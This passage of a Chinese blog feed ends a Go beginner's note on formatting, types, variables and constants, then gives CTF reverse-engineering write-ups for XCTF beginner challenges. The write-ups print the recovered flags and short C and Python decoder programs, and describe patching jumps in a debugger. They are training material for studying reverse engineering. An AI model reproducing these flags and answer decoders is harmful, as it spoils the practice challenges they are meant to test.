class="hljs-subst">\&quot;</span>string<span class="hljs-subst">\&quot;</span>&quot;</span>)<br><br><span class="hljs-comment">//输出带双引号的字符串</span><br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%q<span class="hljs-subst">\n</span>&quot;</span>, <span class="hljs-string">&quot;<span class="hljs-subst">\&quot;</span>string<span class="hljs-subst">\&quot;</span>&quot;</span>)<br><br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%x<span class="hljs-subst">\n</span>&quot;</span>, <span class="hljs-string">&quot;b1ackie&quot;</span>)<br><br><span class="hljs-comment">//输出一个指针的值</span><br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%p<span class="hljs-subst">\n</span>&quot;</span>, <span class="hljs-operator">&amp;</span>p)<br><br><span class="hljs-comment">//使用%后面的数字来控制输出的宽度，默认输出是右对齐，左边加上空格</span><br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;|%6d|%6d|<span class="hljs-subst">\n</span>&quot;</span>, <span class="hljs-number">123</span>, <span class="hljs-number">456789</span>)<br><br><span class="hljs-comment">//输出宽度，同时指定浮点数</span><br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;|%5.2f|%5.2f|<span class="hljs-subst">\n</span>&quot;</span>, <span class="hljs-number">1.2</span>, <span class="hljs-number">3.456</span>)<br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;|%4s|%4s|<span class="hljs-subst">\n</span>&quot;</span>, <span class="hljs-string">&quot;go&quot;</span>, <span class="hljs-string">&quot;good&quot;</span>)<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/08/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/4.png"></p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>在go中不允许这样写</p><blockquote><p>func main</p><p>{</p><p>}</p></blockquote><p>只可以这样写</p><blockquote><p>func main{</p><p>}</p></blockquote><h2 id="Go数据类型"><a href="#Go数据类型" class="headerlink" title="Go数据类型"></a>Go数据类型</h2><p>Go语言按照类别有以下几种数据类型：</p><table><thead><tr><th>类型</th><th>描述</th></tr></thead><tbody><tr><td>布尔型</td><td>布尔型的值只可以是常量true或者false。var b bool = true</td></tr><tr><td>数字类型</td><td>整型int和浮点型float32、float64，go支持整型和浮点型数字，并且支持复数，其中位的运算采用补码</td></tr><tr><td>字符串类型</td><td>字符串是一串固定长度的字符连接起来的字符序列。Go的字符串是由单个字节连接起来的。Go语言的字符串的字节使用UTF-8编码标识Unicode文本</td></tr><tr><td>派生类型</td><td>指针类型<br>数组类型<br>结构化类型<br>Channel类型<br>函数类型<br>切片类型<br>接口类型<br>Map类型</td></tr></tbody></table><h3 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h3><table><thead><tr><th>类型</th><th>描述</th></tr></thead><tbody><tr><td>uint8</td><td>无符号8位整型（0到255）</td></tr><tr><td>uint16</td><td>无符号16位整型（0到65535）</td></tr><tr><td>uint32</td><td>无符号32位整型（0到4294967295）</td></tr><tr><td>uint64</td><td>无符号 64 位整型 (0 到 18446744073709551615)</td></tr><tr><td>int8</td><td>有符号 8 位整型 (-128 到 127)</td></tr><tr><td>int16</td><td>有符号 16 位整型 (-32768 到 32767)</td></tr><tr><td>int32</td><td>有符号 32 位整型 (-2147483648 到 2147483647)</td></tr><tr><td>int64</td><td>有符号 64 位整型 (-9223372036854775808 到 9223372036854775807)</td></tr></tbody></table><h3 id="浮点型"><a href="#浮点型" class="headerlink" title="浮点型"></a>浮点型</h3><table><thead><tr><th>类型</th><th>描述</th></tr></thead><tbody><tr><td>float32</td><td>IEEE-754 32位浮点型数</td></tr><tr><td>float64</td><td>IEEE-754 64位浮点型数</td></tr><tr><td>complex64</td><td>32 位实数和虚数</td></tr><tr><td>complex128</td><td>64 位实数和虚数</td></tr></tbody></table><h3 id="其他数字类型"><a href="#其他数字类型" class="headerlink" title="其他数字类型"></a>其他数字类型</h3><table><thead><tr><th>类型</th><th>描述</th></tr></thead><tbody><tr><td>byte</td><td>类似uint8</td></tr><tr><td>rune</td><td>类似int32</td></tr><tr><td>uint</td><td>32或64位</td></tr><tr><td>int</td><td>与int一样大小</td></tr><tr><td>uintptr</td><td>无符号整型，用于存放一个指针</td></tr></tbody></table><h2 id="Go语言变量"><a href="#Go语言变量" class="headerlink" title="Go语言变量"></a>Go语言变量</h2><p>Go变量名由字母、数字、下划线组成，其中首个字符不能是数字</p><p>声明变量是使用var关键字：</p><blockquote><p>var identifier type</p></blockquote><p>可以一次性声明多个变量：</p><blockquote><p>var identifier1, identifier2 type</p></blockquote><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a <span class="hljs-keyword">string</span> = <span class="hljs-string">&quot;b1ackie&quot;</span><br>fmt.Println(a)<br><span class="hljs-keyword">var</span> b, c <span class="hljs-keyword">int</span> = <span class="hljs-number">1</span>, <span class="hljs-number">2</span><br>fmt.Println(b, c)<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/08/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/5.png"></p><h3 id="变量声明"><a href="#变量声明" class="headerlink" title="变量声明"></a>变量声明</h3><p>声明变量有几种方式</p><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>第一种，指定变量类型，如果没有初始化，则变量默认为零值。</p><blockquote><p>var v_name v_type</p><p>v_name = value</p></blockquote><p>零值就是变量没有做初始化时系统默认设置的值</p><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">//声明一个变量并初始化</span><br><span class="hljs-keyword">var</span> a <span class="hljs-keyword">string</span> = <span class="hljs-string">&quot;b1ackie&quot;</span><br>fmt.Println(a)<br><br><span class="hljs-comment">//声明一个变量，没有初始化，为0值</span><br><span class="hljs-keyword">var</span> b <span class="hljs-keyword">int</span><br>fmt.Println(b)<br><br><span class="hljs-comment">//bool 的0值为false</span><br><span class="hljs-keyword">var</span> c <span class="hljs-keyword">bool</span><br>fmt.Println(c)<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/08/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/6.png"></p><ul><li>数值类型是0</li><li>布尔类型为false</li><li>字符串为空</li></ul><h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>第二种，根据值自行判断变量类型</p><blockquote><p>var v_name = value</p></blockquote><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> str = <span class="hljs-string">&quot;string&quot;</span><br>fmt.Println(str)<br><br><span class="hljs-keyword">var</span> num = <span class="hljs-number">1</span><br>fmt.Println(num)<br><br><span class="hljs-keyword">var</span> flag = <span class="hljs-literal">true</span><br>fmt.Println(flag)<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/08/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/7.png"></p><h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>第三种，使用<code>:=</code>声明变量</p><blockquote><p>v_name := value</p></blockquote><p><code>intValue := 1</code>相当于</p><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">var</span> intValue <span class="hljs-keyword">int</span><br>intValue = <span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><p><code>var str string = &quot;b1ackie&quot;</code>可以简写为<code>str := &quot;b1ackie&quot;</code></p><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>str := <span class="hljs-string">&quot;b1ackie&quot;</span><br>fmt.Println(str)<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="多变量声明"><a href="#多变量声明" class="headerlink" title="多变量声明"></a>多变量声明</h3><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-comment">//这种方式写法一般用于声明全局变量</span><br><span class="hljs-keyword">var</span> (<br>a <span class="hljs-keyword">float32</span><br>b <span class="hljs-keyword">bool</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">//类型相同多个变量，非全局变量</span><br><span class="hljs-keyword">var</span> num1, num2, num3 <span class="hljs-keyword">int</span><br><br><span class="hljs-comment">//自动判断变量类型</span><br><span class="hljs-keyword">var</span> int1, int2, int3 = <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span><br><span class="hljs-comment">//这种不带声明格式的只能在函数中出现</span><br>c, d := <span class="hljs-number">123</span>, <span class="hljs-string">&quot;hello&quot;</span><br>fmt.Println(a, b, c, d)<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="Go语言常量"><a href="#Go语言常量" class="headerlink" title="Go语言常量"></a>Go语言常量</h2><p>常量是一个简单值的标识符，在程序运行时，不会被修改的量。</p><p>常量中的数据类型只可以是布尔型、数字型（整数型、浮点型和复数）和字符串型。</p><p>常量的定义格式：</p><blockquote><p>const identifier [type] = value</p></blockquote><p>也可以省略type，编译器可以根据变量的值来推断其类型</p><ul><li>显示类型定义：const a string = “b1ackie”</li><li>隐式类型定义：const a = “b1ackie”</li></ul><p>多个相同类型声明可以简写为：</p><blockquote><p>const num1, num2 = value1, value2</p></blockquote><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">const</span> length <span class="hljs-keyword">int</span> = <span class="hljs-number">10</span><br><span class="hljs-keyword">const</span> width <span class="hljs-keyword">int</span> = <span class="hljs-number">20</span><br><span class="hljs-keyword">var</span> area <span class="hljs-keyword">int</span><br>area = length * width<br>fmt.Printf(<span class="hljs-string">&quot;the area is %d\n&quot;</span>, area)<br><span class="hljs-keyword">const</span> a, b, c = <span class="hljs-number">1</span>, <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;b1ackie&quot;</span><br>fmt.Println(a, b, c)<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/08/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/8.png"></p><h3 id="iota"><a href="#iota" class="headerlink" title="iota"></a>iota</h3><p>iota，特殊常量，可以认为是一个可以被编译器修改的常量。</p><p>iota在const关键字出现时将被重置为0，const中每新增一行常量声明将使iota计数一次。</p><p>iota可以被用作枚举值：</p><blockquote><p>const(</p><p>​    a = iota</p><p>​    b = iota</p><p>​    c = iota</p><p>)</p></blockquote><p>第一个iota等于0，每当iota在新的一行被使用时，它的值都会自动加1，所以a=0,b=1,c=2。</p><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">const</span> (<br>a = <span class="hljs-literal">iota</span><br>b<br>c<br>d = <span class="hljs-string">&quot;b1ackie&quot;</span><br>e<br>f = <span class="hljs-number">10</span><br>g<br>h = <span class="hljs-literal">iota</span><br>i<br>)<br><span class="hljs-built_in">println</span>(a, b, c, d, e, f, g, h, i)<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/08/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/9.png"></p>]]></content>
    
    
    <categories>
      
      <category>Go语言学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界RE-新手练习区</title>
    <link href="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/"/>
    <url>/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="Hello-CTF"><a href="#Hello-CTF" class="headerlink" title="Hello CTF"></a>Hello CTF</h2><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><p>先查壳，看到无壳，可以直接打开。</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/1.png"></p><p>使用IDA打开，可以看到我们输入的被转为十六进制最终存储在了<code>v10</code>之中，然后和<code>v13</code>比较，我们可以看到这部分的值是</p><blockquote><p>437261636b4d654a757374466f7246756e</p></blockquote><p>那么只需要将这部分十六进制值转为字符就行了，就是flag。</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/2.png"></p><h3 id="注册机"><a href="#注册机" class="headerlink" title="注册机"></a>注册机</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> flag[] =<span class="hljs-string">&quot;\x43\x72\x61\x63\x6b\x4d\x65\x4a\x75\x73\x74\x46\x6f\x72\x46\x75\x6e&quot;</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, flag);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>得到flag</p><blockquote><p>CrackMeJustForFun</p></blockquote><h2 id="insanity"><a href="#insanity" class="headerlink" title="insanity"></a>insanity</h2><p>查看文件可以知道是32位的elf文件</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/3.png"></p><p>使用IDA打开，看到非常简短的main函数，前面会生成一个随机数，然后可以看到<code>str</code>是个数组，生产的随机数除以0xA的余数作为下标，来决定<code>puts</code>函数输出什么。</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/4.png"></p><p>看一下<code>str</code>数组，可以看到flag就在其中，第一个就是flag，当然如果运气好，随机数正好是0xA的倍数也可以自己输出flag。</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/5.png"></p><blockquote><p>9447{This_is_a_flag}</p></blockquote><h2 id="python-trade"><a href="#python-trade" class="headerlink" title="python-trade"></a>python-trade</h2><h3 id="详细分析-1"><a href="#详细分析-1" class="headerlink" title="详细分析"></a>详细分析</h3><p>是一个pyc文件，在网上找一个反编译pyc的网站，查看反编译后的Python代码。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># visit https://tool.lu/pyc/ for more information</span><br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode</span>(<span class="hljs-params">message</span>):</span><br>    s = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> message:<br>        x = <span class="hljs-built_in">ord</span>(i) ^ <span class="hljs-number">32</span><br>        x = x + <span class="hljs-number">16</span><br>        s += <span class="hljs-built_in">chr</span>(x)<br>    <br>    <span class="hljs-keyword">return</span> base64.b64encode(s)<br><br>correct = <span class="hljs-string">&#x27;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Input flag:&#x27;</span><br>flag = raw_input()<br><span class="hljs-keyword">if</span> encode(flag) == correct:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;correct&#x27;</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;wrong&#x27;</span><br></code></pre></div></td></tr></table></figure><p>根据python代码写出注册机，算出flag</p><h3 id="注册机-1"><a href="#注册机-1" class="headerlink" title="注册机"></a>注册机</h3><h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">&quot;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&quot;</span><br>flag = b64decode(flag)<br>s= <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:<br>    i = (i - <span class="hljs-number">16</span>) ^ <span class="hljs-number">32</span><br>    s += <span class="hljs-built_in">chr</span>(i)<br><span class="hljs-built_in">print</span>(s)<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/6.png"></p><h4 id="C"><a href="#C" class="headerlink" title="C"></a>C</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> flag[] = <span class="hljs-string">&quot;^SdVkT#S ]`Y\\!^)\x8f\x80ism&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">21</span>; i++)<br>&#123;<br>flag[i] = (flag[i] - <span class="hljs-number">16</span>) ^ <span class="hljs-number">32</span>;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, flag);<br>&#125;<br></code></pre></div></td></tr></table></figure><blockquote><p>nctf{d3c0mpil1n9_PyC}</p></blockquote><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>查壳，无壳，32位的程序</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/7.png"></p><p>使用IDA打开分析，看到我们输入的值字符串会和<code>v5.m128i_i8</code>进行比较，查看其中的值</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/8.png"></p><p>查看得到flag，注意这里是小端序</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/9.png"></p><blockquote><p>DUTCTF{We1c0met0DUTCTF}</p></blockquote><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><h3 id="详细分析-2"><a href="#详细分析-2" class="headerlink" title="详细分析"></a>详细分析</h3><p>查壳，无壳</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/10.png"></p><p>这是一个游戏，需要把所有的灯都点亮，才可以输出flag。</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/11.png"></p><p>使用OD调试，搜索字符串可以看到flag成功输出的这里，只要能够运行到这里就可以了。</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/12.png"></p><p>可以直接在函数头部右键，选择此处为新的EIP，然后直接跑起来，flag就会自己出来。</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/13.png"></p><p>也可以修改之前的跳转条件，让程序可以运行到输出flag的地方。</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/14.png"></p><h3 id="注册机-2"><a href="#注册机-2" class="headerlink" title="注册机"></a>注册机</h3><p>使用IDA查看，可以看到如果满足所有的条件就会进入<code>sub_457AB4</code></p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/15.png"></p><p>这是生成flag的地方，可以根据这里写出注册机。</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/16.png"></p><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">int main() &#123;<br>unsigned char v5[] = &quot;<span class="hljs-symbol">\x</span>12<span class="hljs-symbol">\x</span>40<span class="hljs-symbol">\x</span>62<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>06<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>06<span class="hljs-symbol">\x</span>30<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>20<span class="hljs-symbol">\x</span>0C<span class="hljs-symbol">\x</span>30<span class="hljs-symbol">\x</span>41&quot;<br>&quot;<span class="hljs-symbol">\x</span>1F<span class="hljs-symbol">\x</span>4E<span class="hljs-symbol">\x</span>3E<span class="hljs-symbol">\x</span>20<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>20<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>39<span class="hljs-symbol">\x</span>60<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>15<span class="hljs-symbol">\x</span>09<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>3E<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>05&quot;<br>&quot;<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>2C<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>4E<span class="hljs-symbol">\x</span>20<span class="hljs-symbol">\x</span>10<span class="hljs-symbol">\x</span>61<span class="hljs-symbol">\x</span>36<span class="hljs-symbol">\x</span>10<span class="hljs-symbol">\x</span>2C<span class="hljs-symbol">\x</span>34<span class="hljs-symbol">\x</span>20<span class="hljs-symbol">\x</span>40&quot;<br>&quot;<span class="hljs-symbol">\x</span>59<span class="hljs-symbol">\x</span>2D<span 